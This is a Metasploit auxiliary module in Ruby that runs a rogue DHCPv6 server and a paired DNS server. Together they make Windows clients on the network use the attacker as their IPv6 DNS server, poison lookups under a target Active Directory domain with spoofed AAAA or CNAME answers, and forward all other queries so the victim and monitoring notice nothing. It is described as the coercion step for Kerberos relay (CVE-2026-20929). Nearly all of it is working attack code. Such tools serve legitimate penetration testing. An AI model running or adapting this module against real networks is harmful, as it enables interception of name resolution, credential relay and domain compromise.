##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::DNS::Client
  include Msf::Exploit::Remote::DNS::Server
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'DHCPv6 DNS Takeover (mitm6-style IPv6 DNS coercion)',
        'Description' => %q{
          This module runs a rogue DHCPv6 server that hands the attacker to IPv6
          clients as their DNS server (the classic mitm6 primitive), and a paired
          DNS server that poisons names under a target domain to point at the
          attacker while transparently forwarding all other lookups so the victim
          stays functional.

          Once a client resolves a target service through the attacker, it can be
          coerced into authenticating to the attacker. Paired with a Kerberos relay
          target (for example ESC8 AD CS web enrollment), this is the native
          coercion half of the Kerberos relay via DNS technique (CVE-2026-20929),
          removing the dependency on external tooling such as mitm6.

          IPv6 is preferred by Windows over IPv4, so becoming the client's IPv6 DNS
          server is enough to intercept its name resolution even on IPv4 networks.
        },
        'Author' => [
          'Pushpender Rathore' # native DHCPv6 + DNS coercion
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-20929'],
          ['URL', 'https://github.com/dirkjanm/mitm6'],
          ['ATT&CK', Mitre::Attack::Technique::T1557_ADVERSARY_IN_THE_MIDDLE]
        ],
        'Actions' => [
          [ 'Service', { 'Description' => 'Run the DHCPv6 and DNS takeover services' } ]
        ],
        'PassiveActions' => [ 'Service' ],
        'DefaultAction' => 'Service',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('TARGET_DOMAIN', [ true, 'The DNS domain to intercept; names under it are poisoned (e.g. ad.example.com).' ]),
        OptString.new('TARGET_HOSTS', [ false, 'Specific FQDNs to poison (space or semicolon separated). If empty, all names under TARGET_DOMAIN are poisoned.' ]),
        OptString.new('SPOOF_IP6', [ true, 'The attacker IPv6 address handed out as the DNS server and returned for poisoned names.' ]),
        OptString.new('RELAY_CNAME', [ false, 'If set, poisoned names are answered with a CNAME to this name (the DNS-CNAME Kerberos relay trick) instead of a direct address.' ]),
        OptString.new('LEASE_IP6', [ false, 'IPv6 address to lease to clients making stateful (IA_NA) requests.' ]),
        OptString.new('DHCPV6_INTERFACE', [ false, 'Network interface to bind the DHCPv6 server and join the multicast group on.' ])
      ]
    )
  end

  def run
    validate_ipv6!(datastore['SPOOF_IP6'], 'SPOOF_IP6')
    validate_ipv6!(datastore['LEASE_IP6'], 'LEASE_IP6') if datastore['LEASE_IP6'].present?

    start_service
    print_status("DNS server started, poisoning names under #{datastore['TARGET_DOMAIN']} -> #{poison_description}")

    start_dhcpv6_server
    print_status("DHCPv6 server started, advertising #{datastore['SPOOF_IP6']} as the DNS server")

    service.wait if service
  rescue Rex::BindFailed => e
    print_error("Failed to bind a service socket: #{e.message}")
  end

  def cleanup
    super
    @dhcpv6_server&.stop
    @dhcpv6_server = nil
  end

  # Poison lookups that fall under the target scope; forward everything else so
  # the victim keeps working (and so we do not tip off monitoring by breaking
  # unrelated name resolution).
  def on_dispatch_request(cli, data)
    return if data.strip.empty?

    req = Packet.encode_drb(data)
    peer = "#{cli.peerhost}:#{cli.peerport}"

    poisoned = false
    req.question.each do |question|
      answers = poison_answers_for(question)
      next if answers.empty?

      answers.each { |rr| req.add_answer(rr) }
      poisoned = true
      print_good("Poisoned #{question.qname} (#{question.qtype}) for #{peer} -> #{poison_description}")
    end

    unless poisoned
      # Not in scope: fall back to the default cache/forward behaviour.
      return service.default_dispatch_request(cli, data)
    end

    req.header.qr = true
    req.header.ra = true
    service.send_response(cli, Packet.validate(req).encode)
  end

  private

  def poison_answers_for(question)
    name = question.qname.to_s.chomp('.').downcase
    return [] unless in_scope?(name)

    qtype = question.qtype.to_s
    if datastore['RELAY_CNAME'].present?
      # Steer the victim onto a name whose SPN the attacker will relay for.
      return [Dnsruby::RR.create(name: "#{name}.", type: 'CNAME', domainname: "#{datastore['RELAY_CNAME'].chomp('.')}.")]
    end

    case qtype
    when 'AAAA'
      [Dnsruby::RR.create(name: "#{name}.", type: 'AAAA', address: datastore['SPOOF_IP6'])]
    when 'A'
      # Only answer A records if an IPv4 spoof address is meaningful; otherwise
      # returning nothing lets the client prefer the AAAA answer we control.
      srvhost = datastore['SRVHOST']
      Rex::Socket.is_ipv4?(srvhost) ? [Dnsruby::RR.create(name: "#{name}.", type: 'A', address: srvhost)] : []
    else
      []
    end
  end

  def in_scope?(name)
    if datastore['TARGET_HOSTS'].present?
      target_hosts.include?(name)
    else
      domain = datastore['TARGET_DOMAIN'].downcase.chomp('.')
      name == domain || name.end_with?(".#{domain}")
    end
  end

  def target_hosts
    @target_hosts ||= datastore['TARGET_HOSTS'].split(/[\s;]+/).map { |h| h.strip.chomp('.').downcase }.reject(&:empty?)
  end

  def start_dhcpv6_server
    @dhcpv6_server = Rex::Proto::DHCPv6::Server.new(
      dns_servers: [datastore['SPOOF_IP6']],
      assigned_address: datastore['LEASE_IP6'],
      domain_list: [datastore['TARGET_DOMAIN']],
      interface: datastore['DHCPV6_INTERFACE'],
      context: { 'Msf' => framework, 'MsfExploit' => self }
    )
    @dhcpv6_server.on_request do |msg_type, client_host, _buf|
      vprint_status("DHCPv6 #{dhcpv6_message_name(msg_type)} from #{client_host}, answered with DNS #{datastore['SPOOF_IP6']}")
    end
    @dhcpv6_server.start
  end

  def poison_description
    datastore['RELAY_CNAME'].present? ? "CNAME #{datastore['RELAY_CNAME']}" : datastore['SPOOF_IP6']
  end

  def dhcpv6_message_name(msg_type)
    Rex::Proto::DHCPv6::Constants::MessageType.constants.find do |c|
      Rex::Proto::DHCPv6::Constants::MessageType.const_get(c) == msg_type
    end || msg_type
  end

  def validate_ipv6!(address, name)
    return if Rex::Socket.is_ipv6?(address.to_s)

    fail_with(Failure::BadConfig, "#{name} must be a valid IPv6 address")
  end
end
